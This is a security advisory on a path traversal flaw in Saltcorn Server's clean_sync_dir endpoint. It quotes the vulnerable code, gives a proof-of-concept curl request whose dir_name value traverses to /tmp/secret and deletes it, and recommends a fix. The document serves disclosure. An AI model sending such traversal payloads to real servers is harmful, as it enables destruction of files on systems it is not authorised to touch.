summary: "Saltcorn Server allows logged-in users to delete arbitrary files because of a path\
  \ traversal vulnerability\n### Summary\n\nA logged-in user with any role can delete arbitrary\
  \ files on the filesystem by calling the `sync/clean_sync_dir` endpoint. The `dir_name` POST\
  \ parameter is not validated/sanitized and is used to construct the `syncDir` that is deleted\
  \ by calling `fs.rm`.\n\n### Details\n\n- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.15/packages/server/routes/sync.js#L337-L346\n\
  \n```js\nrouter.post(\n  \"/clean_sync_dir\",\n  error_catcher(async (req, res) => {\n   \
  \ const { dir_name } = req.body; // [1] source\n    try {\n      const rootFolder = await\
  \ File.rootFolder();\n      const syncDir = path.join(\n        rootFolder.location,\n   \
  \     \"mobile_app\",\n        \"sync\",\n        dir_name // [2]\n      );\n      await fs.rm(syncDir,\
  \ { recursive: true, force: true }); // [3] sink\n      res.status(200).send(\"\");\n    }\
  \ catch (error) {\n      getState().log(2, `POST /sync/clean_sync_dir: '${error.message}'`);\n\
  \      res.status(400).json({ error: error.message || error });\n    }\n  })\n);\n```\n\n\n\
  ### PoC\n\nThe following PoC can be executed with a user with any role (`admin`, `staff`,\
  \ `user`, `public`)\n\n- create a file in a folder different from where the server is started:\n\
  ```\ntouch /tmp/secret\ncat /tmp/secret\n```\n\n- log with a user and retrieve valid `connect.sid`\
  \ and `_csrf` values***\n- send the following `curl` request\n```\ncurl -i -X $'POST' \\\n\
  \  -H $'Host: localhost:3000' \\\n  -H $'Content-Type: application/x-www-form-urlencoded'\
  \ \\\n  -H $'Content-Length: 93' \\\n  -H $'Origin: http://localhost:3000' \\\n  -H $'Connection:\
  \ close' \\\n  -b $'connect.sid=VALID_CONNECT_SID_COOKIE; loggedin=true' \\\n  --data-binary\
  \ $'_csrf=VALID_CSRF_VALUE&dir_name=/../../../../../../../../../../tmp/secret' \\\n  $'http://localhost:3000/sync/clean_sync_dir'\n\
  ```\n\n- check if the file previously created does not exist anymore:\n```\ncat /tmp/secret\n\
  cat: /tmp/secret: No such file or directory\n```\n\n*** obtain `connect.sid` and `_csrf` values\n\
  \nA possible way to retrieve `connect.sid` and `_csrf` values is to use the password reset\
  \ functionality:\n- log in\n- open the browser developer console, go to the `Network` tab\
  \ filter for `settings` request\n- visit `http://localhost:3000/auth/settings`\n- trigger\
  \ the change password functionality\n- under the `Headers` and `Request` tabs, grab the `connect.sid`\
  \ and `_csrf` values and replace them in the curl command \n\n### Impact\n\nArbitrary file\
  \ delete\n\n### Recommended Mitigation\n\nResolve the `syncDir` and check if it starts with\
  \ `rootFolder.location/mobile_app/sync`."
